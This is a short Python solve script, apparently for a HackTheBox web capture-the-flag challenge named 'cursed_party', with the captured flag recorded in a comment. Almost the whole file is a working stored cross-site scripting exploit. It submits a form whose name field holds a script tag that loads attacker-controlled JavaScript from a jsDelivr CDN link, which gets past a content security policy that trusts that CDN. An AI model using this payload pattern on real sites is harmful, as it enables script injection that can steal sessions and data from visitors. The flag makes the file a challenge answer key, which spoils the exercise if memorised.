import requests
import json

def main():
    URL = 'http://159.65.20.166:31087/api/submit'

    # https://github.com/dillonwu-97/csec-code/blob/main/hackthebox/challenges/web/cursed_party/solve.js 
    # https://cdn.jsdelivr.net/gh/dillonwu-97/csec-code@main/hackthebox/challenges/web/cursed_party/solve.js
    # It's not appearing for some reason
    # cool resource for csps
    # https://csp-evaluator.withgoogle.com/
    atk_url = 'https://cdn.jsdelivr.net/gh/dillonwu-97/csec-code@main/hackthebox/challenges/web/cursed_party/solve.js'
    atk_url = 'https://cdn.jsdelivr.net/gh/dillonwu-97/csec-code@29366f2069140bd899045ffe75f613a6112c0e9c/hackthebox/challenges/web/cursed_party/solve.js'
    r = requests.post(url=URL,
                      data={
                        "halloween_name": f'<script src="{atk_url}"></script>',
                        "email": "a@gmail.com",
                        "costume_type": "monster",
                        "trick_or_treat": "tricks"
                      })
    print(r.text)
    print(r.status_code)
    # Flag: HTB{d0n't_4ll0w_cdn_1n_c5p!!}


if __name__ == "__main__":
    main()
